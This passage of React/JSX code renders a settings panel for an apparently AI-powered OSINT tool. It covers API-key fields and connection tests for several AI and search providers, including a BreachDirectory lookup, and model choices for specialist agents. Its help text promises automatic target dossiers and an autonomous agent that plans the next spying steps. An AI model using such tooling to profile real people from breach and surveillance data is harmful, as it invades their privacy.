                                            <div className={`mt-2 text-[10px] font-mono p-2 border ${openRouterStatus === 'success' ? 'bg-emerald-950/40 border-emerald-800 text-emerald-300' : 'bg-red-950/40 border-red-800 text-red-400'}`}>
                                                {openRouterMsg}
                                            </div>
                                        )}
                                    </div>

                                    <div>
                                        <div className="flex items-center justify-between mb-1">
                                            <label className="text-[10px] text-gray-500 uppercase font-bold block">Model Selection (NVIDIA / OpenRouter)</label>
                                            <button
                                                type="button"
                                                onClick={fetchLiveModels}
                                                disabled={liveModelsLoading}
                                                className="text-[9px] text-emerald-400 hover:text-emerald-300 flex items-center gap-1 font-mono hover:underline"
                                            >
                                                <RefreshCw size={10} className={liveModelsLoading ? 'animate-spin' : ''} />
                                                {liveModelsLoading ? 'Mengimbas API...' : 'Muat Semula Katalog Live'}
                                            </button>
                                        </div>
                                        <select 
                                            value={config.openrouterModel || config.modelName || 'nvidia/nemotron-3.5-lightning:free'} 
                                            onChange={(e) => setConfig({
                                                ...config, 
                                                openrouterModel: e.target.value,
                                                modelName: e.target.value
                                            })} 
                                            className="w-full bg-black border border-gray-700 text-white text-xs py-2 px-3 focus:border-emerald-500 outline-none"
                                        >
                                            <optgroup label="⚡ NVIDIA NEMOTRON ULTRA & LIGHTNING (Pantas / Penaakulan Mendalam)">
                                                <option value="nvidia/nemotron-3.5-lightning:free">★ NVIDIA Nemotron 3.5 Lightning (1,000,000 Konteks Token / Pantas)</option>
                                                <option value="nvidia/nemotron-3-super-120b-a12b:free">★ NVIDIA Nemotron 3 Super 120B (262K Konteks Token / Deep Logic)</option>
                                                <option value="nvidia/nemotron-3-ultra-550b-a55b:free">★ NVIDIA Nemotron 3 Ultra 550B (1,000,000 Konteks Token / Analisis Mega)</option>
                                                <option value="nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free">★ NVIDIA Nemotron 3 Nano Omni (256K Context / Imej + Video + OSINT)</option>
                                            </optgroup>

                                            <optgroup label="🏢 NVIDIA DIRECT NIM ENDPOINTS (Kunci nvapi-...)">
                                                <option value="nvidia/llama-3.1-nemotron-70b-instruct">NVIDIA Llama 3.1 Nemotron 70B Instruct</option>
                                                <option value="nvidia/nemotron-4-340b-instruct">NVIDIA Nemotron 4 340B Instruct</option>
                                                <option value="meta/llama-3.3-70b-instruct">Meta Llama 3.3 70B Instruct</option>
                                            </optgroup>

                                            <optgroup label="🛠️ Pilihan Kustom">
                                                <option value="custom">Custom Model ID...</option>
                                            </optgroup>
                                        </select>
                                    </div>

                                    {(config.openrouterModel === 'custom' || (![
                                        'nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free',
                                        'google/gemma-4-31b-it:free',
                                        'google/gemma-4-26b-a4b-it:free',
                                        'nvidia/nemotron-nano-12b-v2-vl:free',
                                        'nvidia/nemotron-3-ultra-550b-a55b:free',
                                        'nvidia/nemotron-3-super-120b-a12b:free',
                                        'nvidia/nemotron-3.5-lightning:free',
                                        'openrouter/free'
                                    ].includes(config.openrouterModel || ''))) && (
                                        <div>
                                            <label className="text-[10px] text-gray-500 uppercase font-bold mb-1 block">Custom Model ID</label>
                                            <input 
                                                type="text" 
                                                value={config.openrouterModel || ''} 
                                                onChange={(e) => setConfig({
                                                    ...config, 
                                                    openrouterModel: e.target.value,
                                                    modelName: e.target.value
                                                })} 
                                                placeholder="cth: meta-llama/llama-3.3-70b-instruct:free" 
                                                className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 px-3 focus:border-emerald-500 outline-none font-mono" 
                                            />
                                        </div>
                                    )}

                                    <div className="text-[9px] text-gray-400 bg-white/5 p-2 rounded flex flex-col gap-1">
                                        <div className="text-white font-bold">💡 Cara Menggunakan AI Nemotron Untuk OSINT:</div>
                                        <div>1. <strong>Dossier Synthesis:</strong> Menjana profil sasaran lengkap & hubungan rangkaian automatik dari graf.</div>
                                        <div>2. <strong>Node Intelligence:</strong> Menilai kredibiliti data & menjejak anomali digital pada nod individu.</div>
                                        <div>3. <strong>Autonomous OSINT Agent:</strong> Bertindak sebagai ejen strategik berautonomi merangka langkah pengintipan seterusnya.</div>
                                    </div>
                                 </div>
                            )}
                            {config.provider === 'google' && (
                                 <div className="space-y-3">
                                    <div className="bg-[#00f0ff]/10 border border-[#00f0ff]/30 p-3 rounded-sm space-y-1">
                                        <div className="flex items-center gap-2 text-[#00f0ff] font-bold text-xs uppercase">
                                            <span className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></span> Google AI Studio System Key Aktif secara Default
                                        </div>
                                        <p className="text-[10px] text-gray-300 leading-relaxed">
                                            Aplikasi ini telah dilengkapi secara automatik dengan kunci percuma <strong>Google Gemini Free-Tier Key</strong> di pelayan server. Anda <strong>TIDAK PERLU</strong> memasukkan sebarang API key di sini kecuali jika anda mahu menggunakan kunci kustom anda sendiri atau persediaan <strong>Round-Robin Rotation</strong>.
                                        </p>
                                    </div>

                                    <div>
                                        <div className="flex items-center justify-between mb-1">
                                            <label className="text-[10px] text-gray-500 uppercase font-bold block">Google AI Studio API Key (Pilihan / Optional)</label>
                                            {countKeys(config.apiKey) > 1 && (
                                                <span className="text-[9px] bg-emerald-950/80 text-emerald-400 border border-emerald-700/50 px-2 py-0.5 rounded font-mono flex items-center gap-1">
                                                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                                                    {countKeys(config.apiKey)} Kunci Aktif (Round-Robin Pool)
                                                </span>
                                            )}
                                        </div>
                                        <div className="flex items-center gap-2">
                                            <div className="relative flex-1 flex items-center">
                                                <input 
                                                    type={showApiKey ? "text" : "password"} 
                                                    value={config.apiKey || ''} 
                                                    onChange={(e) => setConfig({...config, apiKey: e.target.value})} 
                                                    placeholder="Biarkan kosong untuk guna Server Default, atau masukkan format baru (AQ...) / legasi (AIza...)" 
                                                    className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 pl-3 pr-10 focus:border-[#ff0033] outline-none font-mono" 
                                                />
                                                <button
                                                    type="button"
                                                    onClick={() => setShowApiKey(!showApiKey)}
                                                    className="absolute right-2 text-gray-400 hover:text-white p-1"
                                                    title={showApiKey ? "Sembunyikan Kunci" : "Pamerkan Kunci (Mengintai)"}
                                                >
                                                    {showApiKey ? <EyeOff className="w-4 h-4 text-[#ff0033]" /> : <Eye className="w-4 h-4" />}
                                                </button>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={testGemini}
                                                disabled={geminiStatus === 'testing'}
                                                className={`px-3 py-2 text-xs font-bold font-mono transition-all flex items-center gap-1.5 shrink-0 border ${
                                                    geminiStatus === 'testing'
                                                        ? 'bg-amber-950/60 border-amber-500/50 text-amber-300 animate-pulse'
                                                        : geminiStatus === 'success'
                                                        ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300 hover:bg-emerald-900/60'
                                                        : geminiStatus === 'fail'
                                                        ? 'bg-red-950/60 border-red-500/50 text-red-300 hover:bg-red-900/60'
                                                        : 'bg-zinc-900 border-gray-700 text-zinc-300 hover:text-white hover:border-gray-500'
                                                }`}
                                            >
                                                {geminiStatus === 'testing' ? (
                                                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                                ) : (
                                                    <CheckCircle2 className="w-3.5 h-3.5" />
                                                )}
                                                <span>{geminiStatus === 'testing' ? 'MENGUJI...' : geminiStatus === 'success' ? 'ONLINE' : 'UJI SAMBUNGAN'}</span>
                                            </button>
                                        </div>

                                        {geminiMsg && (
                                            <div className={`mt-2 p-2 rounded text-[11px] border font-mono flex items-start gap-2 ${
                                                geminiStatus === 'success' 
                                                    ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300' 
                                                    : 'bg-red-950/40 border-red-500/40 text-red-300'
                                            }`}>
                                                {geminiStatus === 'success' ? (
                                                    <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                                                ) : (
                                                    <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                                                )}
                                                <span className="leading-snug">{geminiMsg}</span>
                                            </div>
                                        )}

                                        <div className="text-[10px] text-gray-400 mt-1 flex items-center justify-between">
                                            <span>Masukkan berbilang kunci (diasingkan koma) untuk <strong>Round-Robin Rotation</strong>.</span>
                                            <a 
                                                href="https://aistudio.google.com/app/apikey" 
                                                target="_blank" 
                                                rel="noreferrer" 
                                                className="text-[#ff0033] hover:underline font-mono text-[9px] flex items-center gap-1"
                                            >
                                                Dapatkan Key Percuma ↗
                                            </a>
                                        </div>
                                    </div>
                                    <div>
                                        <label className="text-[10px] text-gray-500 uppercase font-bold mb-1 block">Model Name (Google AI Studio - Gemini 3.7 Flash)</label>
                                        <select 
                                            value={config.modelName && !config.modelName.includes('pro') ? config.modelName : 'gemini-3.7-flash'} 
                                            onChange={(e) => setConfig({...config, modelName: e.target.value})} 
                                            className="w-full bg-black border border-gray-700 text-white text-xs py-2 px-3 focus:border-[#ff0033] outline-none"
                                        >
                                            <option value="gemini-3.7-flash">Gemini 3.7 Flash (Utama / Flash Engine)</option>
                                            <option value="gemini-3.6-flash">Gemini 3.6 Flash</option>
                                            <option value="gemini-3.1-flash-lite">Gemini 3.1 Flash Lite (Paling Pantas / Low Latency)</option>
                                            <option value="gemini-flash-latest">Gemini Flash Latest (Versi Terkini)</option>
                                            <option value="gemini-3-flash-preview">Gemini 3.0 Flash Preview</option>
                                            <option value="gemini-3.1-flash-live-preview">Gemini 3.1 Flash Live Preview</option>
                                        </select>
                                        <div className="text-[9px] text-emerald-400 mt-1 flex items-center gap-1.5 font-mono">
                                            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
                                            <span>Siri Gemini Flash Sahaja (Percuma - Google AI Studio)</span>
                                        </div>
                                    </div>
                                 </div>
                            )}

                            {config.provider === 'deepseek' && (
                                 <div className="space-y-3">
                                    <div>
                                        <div className="flex items-center justify-between mb-1">
                                            <label className="text-[10px] text-gray-500 uppercase font-bold block">DeepSeek API Key</label>
                                            {countKeys(config.apiKey) > 1 && (
                                                <span className="text-[9px] bg-emerald-950/80 text-emerald-400 border border-emerald-700/50 px-2 py-0.5 rounded font-mono flex items-center gap-1">
                                                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                                                    {countKeys(config.apiKey)} Kunci Aktif (Round-Robin Pool)
                                                </span>
                                            )}
                                        </div>
                                        <div className="flex items-center gap-2">
                                            <div className="relative flex-1 flex items-center">
                                                <input 
                                                    type={showDeepSeekKey ? "text" : "password"} 
                                                    value={config.apiKey || ''} 
                                                    onChange={(e) => setConfig({...config, apiKey: e.target.value})} 
                                                    placeholder="sk-... (Asingkan dengan koma untuk berbilang kunci)" 
                                                    className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 pl-3 pr-10 focus:border-[#ff0033] outline-none font-mono" 
                                                />
                                                <button
                                                    type="button"
                                                    onClick={() => setShowDeepSeekKey(!showDeepSeekKey)}
                                                    className="absolute right-2 text-gray-400 hover:text-white p-1"
                                                    title={showDeepSeekKey ? "Sembunyikan Kunci" : "Pamerkan Kunci (Mengintai)"}
                                                >
                                                    {showDeepSeekKey ? <EyeOff className="w-4 h-4 text-[#ff0033]" /> : <Eye className="w-4 h-4" />}
                                                </button>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={testDeepSeek}
                                                disabled={deepseekStatus === 'testing'}
                                                className={`px-3 py-2 text-xs font-bold font-mono transition-all flex items-center gap-1.5 shrink-0 border ${
                                                    deepseekStatus === 'testing'
                                                        ? 'bg-amber-950/60 border-amber-500/50 text-amber-300 animate-pulse'
                                                        : deepseekStatus === 'success'
                                                        ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300 hover:bg-emerald-900/60'
                                                        : deepseekStatus === 'fail'
                                                        ? 'bg-red-950/60 border-red-500/50 text-red-300 hover:bg-red-900/60'
                                                        : 'bg-zinc-900 border-gray-700 text-zinc-300 hover:text-white hover:border-gray-500'
                                                }`}
                                            >
                                                {deepseekStatus === 'testing' ? (
                                                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                                ) : (
                                                    <CheckCircle2 className="w-3.5 h-3.5" />
                                                )}
                                                <span>{deepseekStatus === 'testing' ? 'MENGUJI...' : deepseekStatus === 'success' ? 'ONLINE' : 'UJI SAMBUNGAN'}</span>
                                            </button>
                                        </div>

                                        {deepseekMsg && (
                                            <div className={`mt-2 p-2 rounded text-[11px] border font-mono flex items-start gap-2 ${
                                                deepseekStatus === 'success' 
                                                    ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300' 
                                                    : 'bg-red-950/40 border-red-500/40 text-red-300'
                                            }`}>
                                                {deepseekStatus === 'success' ? (
                                                    <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                                                ) : (
                                                    <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                                                )}
                                                <span className="leading-snug">{deepseekMsg}</span>
                                            </div>
                                        )}
                                    </div>
                                    <div>
                                        <label className="text-[10px] text-gray-500 uppercase font-bold mb-1 block">Model Name</label>
                                        <select 
                                            value={config.modelName || 'deepseek-chat'} 
                                            onChange={(e) => setConfig({...config, modelName: e.target.value})} 
                                            className="w-full bg-black border border-gray-700 text-white text-xs py-2 px-3 focus:border-[#ff0033] outline-none"
                                        >
                                            <option value="deepseek-chat">DeepSeek Chat (V3)</option>
                                            <option value="deepseek-reasoner">DeepSeek Reasoner (R1)</option>
                                        </select>
                                    </div>
                                 </div>
                            )}
                        </div>
                        {/* --- MULTI-AGENT ORCHESTRATOR MATRIX CONFIGURATION --- */}
                        <div className="bg-black border border-cyan-900/60 p-4 mt-4 relative overflow-hidden">
                            <div className="flex items-center justify-between mb-3 border-b border-gray-800 pb-2">
                                <h3 className="text-white font-bold uppercase text-xs flex items-center gap-2 text-cyan-400">
                                    <Cpu size={14} className="text-cyan-400" /> Multi-Agent AI Matrix & Specialist Roles
                                </h3>
                                <span className="text-[9px] font-mono text-emerald-400 bg-emerald-950/60 border border-emerald-800 px-2 py-0.5 rounded">
                                    Parallel Optimization
                                </span>
                            </div>

                            <p className="text-[10px] text-gray-400 mb-4">
                                Tetapkan model AI khusus (100% percuma) untuk setiap jenis tugasan risikan. Sistem akan mengoptimumkan eksekusi secara automatik atau serentak (Parallel Consensus).
                            </p>

                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
                                {/* Agent 1: Vision */}
                                <div className="p-3 bg-[#111] border border-gray-800 rounded">
                                    <div className="flex items-center justify-between mb-1">
                                        <span className="text-xs font-bold text-cyan-300">Agent 1: Vision & Video Specialist</span>
                                        <span className="text-[9px] font-mono text-gray-500">Imej / Video / CCTV</span>
                                    </div>
                                    <label className="text-[9px] text-gray-500 uppercase block mb-1">Model Utama:</label>
                                    <select
                                        value={config.agentMatrix?.visionAgentPrimary || 'nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free'}
                                        onChange={(e) => setConfig({
                                            ...config,
                                            agentMatrix: {
                                                ...(config.agentMatrix || {
                                                    autoDispatch: true,
                                                    promptBeforeRun: false,
                                                    consensusMode: false,
                                                    visionAgentPrimary: '',
                                                    visionAgentSecondary: '',
                                                    strategyAgentPrimary: '',
                                                    strategyAgentSecondary: '',
                                                    reconAgentPrimary: '',
                                                    reconAgentSecondary: '',
                                                    securityAgentPrimary: '',
                                                    securityAgentSecondary: ''
                                                }),
                                                visionAgentPrimary: e.target.value
                                            }
                                        })}
                                        className="w-full bg-black border border-gray-700 text-white text-[11px] py-1.5 px-2 focus:border-cyan-500 outline-none font-mono"
                                    >
                                        <option value="nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free">NVIDIA: Nemotron 3 Nano Omni (256K / Video+Imej)</option>
                                        <option value="google/gemma-4-31b-it:free">Google: Gemma 4 31B Vision (262K)</option>
                                        <option value="nvidia/nemotron-nano-12b-v2-vl:free">NVIDIA: Nemotron Nano 12B VL (128K)</option>
                                        <option value="google/gemma-4-26b-a4b-it:free">Google: Gemma 4 26B MoE Vision (262K)</option>
                                    </select>
                                </div>

                                {/* Agent 2: Strategy & Dossier */}
                                <div className="p-3 bg-[#111] border border-gray-800 rounded">
                                    <div className="flex items-center justify-between mb-1">
                                        <span className="text-xs font-bold text-amber-300">Agent 2: Strategic Dossier Synthesizer</span>
                                        <span className="text-[9px] font-mono text-gray-500">Dossier / Strategi</span>
                                    </div>
                                    <label className="text-[9px] text-gray-500 uppercase block mb-1">Model Utama:</label>
                                    <select
                                        value={config.agentMatrix?.strategyAgentPrimary || 'nvidia/nemotron-3-ultra-550b-a55b:free'}
                                        onChange={(e) => setConfig({
                                            ...config,
                                            agentMatrix: {
                                                ...(config.agentMatrix || {
                                                    autoDispatch: true,
                                                    promptBeforeRun: false,
                                                    consensusMode: false,
                                                    visionAgentPrimary: '',
                                                    visionAgentSecondary: '',
                                                    strategyAgentPrimary: '',
                                                    strategyAgentSecondary: '',
                                                    reconAgentPrimary: '',
                                                    reconAgentSecondary: '',
                                                    securityAgentPrimary: '',
                                                    securityAgentSecondary: ''
                                                }),
                                                strategyAgentPrimary: e.target.value
                                            }
                                        })}
                                        className="w-full bg-black border border-gray-700 text-white text-[11px] py-1.5 px-2 focus:border-amber-500 outline-none font-mono"
                                    >
                                        <option value="nvidia/nemotron-3-ultra-550b-a55b:free">NVIDIA: Nemotron 3 Ultra 550B (1,000,000 Token Context)</option>
                                        <option value="nvidia/nemotron-3-super-120b-a12b:free">NVIDIA: Nemotron 3 Super 120B (262K Context)</option>
                                        <option value="nvidia/nemotron-3.5-lightning:free">NVIDIA: Nemotron 3.5 Lightning (1,000,000 Context)</option>
                                    </select>
                                </div>

                                {/* Agent 3: High-Speed Recon */}
                                <div className="p-3 bg-[#111] border border-gray-800 rounded">
                                    <div className="flex items-center justify-between mb-1">
                                        <span className="text-xs font-bold text-emerald-300">Agent 3: Entity Extraction Correlator</span>
                                        <span className="text-[9px] font-mono text-gray-500">Ekstraksi / Graf</span>
                                    </div>
                                    <label className="text-[9px] text-gray-500 uppercase block mb-1">Model Utama:</label>
                                    <select
                                        value={config.agentMatrix?.reconAgentPrimary || 'nvidia/nemotron-3.5-lightning:free'}
                                        onChange={(e) => setConfig({
                                            ...config,
                                            agentMatrix: {
                                                ...(config.agentMatrix || {
                                                    autoDispatch: true,
                                                    promptBeforeRun: false,
                                                    consensusMode: false,
                                                    visionAgentPrimary: '',
                                                    visionAgentSecondary: '',
                                                    strategyAgentPrimary: '',
                                                    strategyAgentSecondary: '',
                                                    reconAgentPrimary: '',
                                                    reconAgentSecondary: '',
                                                    securityAgentPrimary: '',
                                                    securityAgentSecondary: ''
                                                }),
                                                reconAgentPrimary: e.target.value
                                            }
                                        })}
                                        className="w-full bg-black border border-gray-700 text-white text-[11px] py-1.5 px-2 focus:border-emerald-500 outline-none font-mono"
                                    >
                                        <option value="nvidia/nemotron-3.5-lightning:free">NVIDIA: Nemotron 3.5 Lightning (1,000,000 Context / Pantas)</option>
                                        <option value="google/gemma-4-26b-a4b-it:free">Google: Gemma 4 26B MoE (262K Context)</option>
                                        <option value="openai/gpt-oss-20b:free">OpenAI: gpt-oss-20b (131K Context)</option>
                                    </select>
                                </div>

                                {/* Agent 4: Threat Intelligence */}
                                <div className="p-3 bg-[#111] border border-gray-800 rounded">
                                    <div className="flex items-center justify-between mb-1">
                                        <span className="text-xs font-bold text-rose-300">Agent 4: Vulnerability & Threat Auditor</span>
                                        <span className="text-[9px] font-mono text-gray-500">CVE / Shodan / Dark Web</span>
                                    </div>
                                    <label className="text-[9px] text-gray-500 uppercase block mb-1">Model Utama:</label>
                                    <select
                                        value={config.agentMatrix?.securityAgentPrimary || 'nvidia/nemotron-3-super-120b-a12b:free'}
                                        onChange={(e) => setConfig({
                                            ...config,
                                            agentMatrix: {
                                                ...(config.agentMatrix || {
                                                    autoDispatch: true,
                                                    promptBeforeRun: false,
                                                    consensusMode: false,
                                                    visionAgentPrimary: '',
                                                    visionAgentSecondary: '',
                                                    strategyAgentPrimary: '',
                                                    strategyAgentSecondary: '',
                                                    reconAgentPrimary: '',
                                                    reconAgentSecondary: '',
                                                    securityAgentPrimary: '',
                                                    securityAgentSecondary: ''
                                                }),
                                                securityAgentPrimary: e.target.value
                                            }
                                        })}
                                        className="w-full bg-black border border-gray-700 text-white text-[11px] py-1.5 px-2 focus:border-rose-500 outline-none font-mono"
                                    >
                                        <option value="nvidia/nemotron-3-super-120b-a12b:free">NVIDIA: Nemotron 3 Super 120B (262K Context)</option>
                                        <option value="nvidia/nemotron-3-ultra-550b-a55b:free">NVIDIA: Nemotron 3 Ultra 550B (1,000,000 Token)</option>
                                    </select>
                                </div>
                            </div>

                            {/* Automation Toggles */}
                            <div className="pt-2 border-t border-gray-800 space-y-2">
                                <label className="flex items-center gap-2 cursor-pointer select-none">
                                    <input
                                        type="checkbox"
                                        checked={config.agentMatrix?.promptBeforeRun ?? true}
                                        onChange={(e) => setConfig({
                                            ...config,
                                            agentMatrix: {
                                                ...(config.agentMatrix || {
                                                    autoDispatch: true,
                                                    promptBeforeRun: true,
                                                    consensusMode: false,
                                                    visionAgentPrimary: 'nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free',
                                                    visionAgentSecondary: 'google/gemma-4-31b-it:free',
                                                    strategyAgentPrimary: 'nvidia/nemotron-3-ultra-550b-a55b:free',
                                                    strategyAgentSecondary: 'nvidia/nemotron-3-super-120b-a12b:free',
                                                    reconAgentPrimary: 'nvidia/nemotron-3.5-lightning:free',
                                                    reconAgentSecondary: 'google/gemma-4-26b-a4b-it:free',
                                                    securityAgentPrimary: 'nvidia/nemotron-3-super-120b-a12b:free',
                                                    securityAgentSecondary: 'nvidia/nemotron-3-ultra-550b-a55b:free'
                                                }),
                                                promptBeforeRun: e.target.checked
                                            }
                                        })}
                                        className="rounded border-gray-700 bg-black text-cyan-500 focus:ring-cyan-500 h-3.5 w-3.5"
                                    />
                                    <span className="text-[11px] text-gray-300">
                                        Papar <strong>Pre-Flight Dispatcher Prompt</strong> sebelum analisis bermula (beri pilihan syor model / dual-agent consensus)
                                    </span>
                                </label>
                            </div>
                        </div>

                        <div className="bg-black border border-gray-800 p-4 mt-4">
                            <h3 className="text-white font-bold uppercase text-xs mb-3 flex items-center gap-2 text-cyan-500"><Search size={14} /> External Search APIs</h3>
                            <div className="space-y-4">
                                <div>
                                    <label className="text-[10px] text-gray-500 uppercase font-bold mb-1 block">Tavily API Key (AI Search)</label>
                                    <div className="flex items-center gap-2">
                                        <div className="relative flex-1 flex items-center">
                                            <input 
                                                type={showTavilyKey ? "text" : "password"} 
                                                value={config.tavilyApiKey || ''} 
                                                onChange={(e) => setConfig({...config, tavilyApiKey: e.target.value})} 
                                                placeholder="Enter key from tavily.com (tvly-...)" 
                                                className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 pl-3 pr-10 focus:border-cyan-500 outline-none font-mono" 
                                            />
                                            <button
                                                type="button"
                                                onClick={() => setShowTavilyKey(!showTavilyKey)}
                                                className="absolute right-2 text-gray-400 hover:text-white p-1"
                                                title={showTavilyKey ? "Sembunyikan Kunci" : "Pamerkan Kunci (Mengintai)"}
                                            >
                                                {showTavilyKey ? <EyeOff className="w-4 h-4 text-cyan-400" /> : <Eye className="w-4 h-4" />}
                                            </button>
                                        </div>
                                        <button
                                            type="button"
                                            onClick={testTavily}
                                            disabled={tavilyStatus === 'testing'}
                                            className={`px-3 py-2 text-xs font-bold font-mono transition-all flex items-center gap-1.5 shrink-0 border ${
                                                tavilyStatus === 'testing'
                                                    ? 'bg-amber-950/60 border-amber-500/50 text-amber-300 animate-pulse'
                                                    : tavilyStatus === 'success'
                                                    ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300 hover:bg-emerald-900/60'
                                                    : tavilyStatus === 'fail'
                                                    ? 'bg-red-950/60 border-red-500/50 text-red-300 hover:bg-red-900/60'
                                                    : 'bg-zinc-900 border-gray-700 text-zinc-300 hover:text-white hover:border-gray-500'
                                            }`}
                                        >
                                            {tavilyStatus === 'testing' ? (
                                                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                            ) : (
                                                <CheckCircle2 className="w-3.5 h-3.5" />
                                            )}
                                            <span>{tavilyStatus === 'testing' ? 'MENGUJI...' : tavilyStatus === 'success' ? 'ONLINE' : 'UJI SAMBUNGAN'}</span>
                                        </button>
                                    </div>

                                    {tavilyMsg && (
                                        <div className={`mt-2 p-2 rounded text-[11px] border font-mono flex items-start gap-2 ${
                                            tavilyStatus === 'success' 
                                                ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300' 
                                                : 'bg-red-950/40 border-red-500/40 text-red-300'
                                        }`}>
                                            {tavilyStatus === 'success' ? (
                                                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                                            ) : (
                                                <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                                            )}
                                            <span className="leading-snug">{tavilyMsg}</span>
                                        </div>
                                    )}
                                </div>
                                <div>
                                    <label className="text-[10px] text-gray-500 uppercase font-bold mb-1 block">RapidAPI Key (Horizon12 / BreachDirectory)</label>
                                    <div className="flex items-center gap-2">
                                        <div className="relative flex-1 flex items-center">
                                            <input 
                                                type={showRapidKey ? "text" : "password"} 
                                                value={config.rapidApiKey || ''} 
                                                onChange={(e) => setConfig({...config, rapidApiKey: e.target.value})} 
                                                placeholder="Enter X-RapidAPI-Key" 
                                                className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 pl-3 pr-10 focus:border-cyan-500 outline-none font-mono" 
                                            />
                                            <button
                                                type="button"
                                                onClick={() => setShowRapidKey(!showRapidKey)}
                                                className="absolute right-2 text-gray-400 hover:text-white p-1"
                                                title={showRapidKey ? "Sembunyikan Kunci" : "Pamerkan Kunci (Mengintai)"}
                                            >
                                                {showRapidKey ? <EyeOff className="w-4 h-4 text-cyan-400" /> : <Eye className="w-4 h-4" />}
                                            </button>
                                        </div>
                                        <button
                                            type="button"
                                            onClick={testRapidApi}
                                            disabled={rapidStatus === 'testing'}
                                            className={`px-3 py-2 text-xs font-bold font-mono transition-all flex items-center gap-1.5 shrink-0 border ${
                                                rapidStatus === 'testing'
                                                    ? 'bg-amber-950/60 border-amber-500/50 text-amber-300 animate-pulse'
                                                    : rapidStatus === 'success'
                                                    ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300 hover:bg-emerald-900/60'
                                                    : rapidStatus === 'fail'
                                                    ? 'bg-red-950/60 border-red-500/50 text-red-300 hover:bg-red-900/60'
                                                    : 'bg-zinc-900 border-gray-700 text-zinc-300 hover:text-white hover:border-gray-500'
                                            }`}
                                        >
                                            {rapidStatus === 'testing' ? (
                                                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                            ) : (
                                                <CheckCircle2 className="w-3.5 h-3.5" />
                                            )}
                                            <span>{rapidStatus === 'testing' ? 'MENGUJI...' : rapidStatus === 'success' ? 'ONLINE' : 'UJI SAMBUNGAN'}</span>
                                        </button>
                                    </div>

                                    {rapidMsg && (
                                        <div className={`mt-2 p-2 rounded text-[11px] border font-mono flex items-start gap-2 ${
                                            rapidStatus === 'success' 
                                                ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300' 
                                                : 'bg-red-950/40 border-red-500/40 text-red-300'
                                        }`}>
                                            {rapidStatus === 'success' ? (
                                                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                                            ) : (
                                                <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                                            )}
                                            <span className="leading-snug">{rapidMsg}</span>
                                        </div>
                                    )}
                                </div>

                                {/* Google Custom Search (SOCINT) Section */}
                                <div className="border-t border-gray-800 pt-3">
                                    <div className="flex items-center justify-between mb-1.5">
                                        <label className="text-[10px] text-cyan-400 uppercase font-bold flex items-center gap-1.5">
                                            <span>Google Custom Search (SOCINT)</span>
                                            <span className="px-1.5 py-0.2 bg-cyan-950/80 border border-cyan-700 text-[9px] rounded text-cyan-300">Default CX: 53a0041f2f24f4e3b</span>
                                        </label>
                                    </div>
                                    
                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-2">
                                        <div>
                                            <span className="text-[9px] text-gray-500 uppercase font-bold block mb-1">Search Engine ID (CX)</span>
                                            <input 
                                                type="text"
                                                value={config.googleCseId !== undefined ? config.googleCseId : '53a0041f2f24f4e3b'}
                                                onChange={(e) => setConfig({...config, googleCseId: e.target.value})}
                                                placeholder="53a0041f2f24f4e3b"
                                                className="w-full bg-[#111] border border-gray-700 text-cyan-300 text-xs py-2 px-3 focus:border-cyan-500 outline-none font-mono"
                                            />
                                        </div>
                                        <div>
                                            <span className="text-[9px] text-gray-500 uppercase font-bold block mb-1">Google Cloud CSE API Key (Pilihan)</span>
                                            <div className="relative flex items-center">
                                                <input 
                                                    type={showGoogleCseKey ? "text" : "password"}
                                                    value={config.googleCseApiKey || ''}
                                                    onChange={(e) => setConfig({...config, googleCseApiKey: e.target.value})}
                                                    placeholder="AIzaSy... (Atau biar kosong untuk mod fallback)"
                                                    className="w-full bg-[#111] border border-gray-700 text-white text-xs py-2 pl-3 pr-8 focus:border-cyan-500 outline-none font-mono"
                                                />
                                                <button
                                                    type="button"
                                                    onClick={() => setShowGoogleCseKey(!showGoogleCseKey)}
                                                    className="absolute right-2 text-gray-400 hover:text-white p-1"
                                                >
                                                    {showGoogleCseKey ? <EyeOff className="w-3.5 h-3.5 text-cyan-400" /> : <Eye className="w-3.5 h-3.5" />}
                                                </button>
                                            </div>
                                        </div>
                                    </div>

                                    <div className="flex items-center justify-between gap-2">
                                        <p className="text-[10px] text-gray-500 leading-tight">
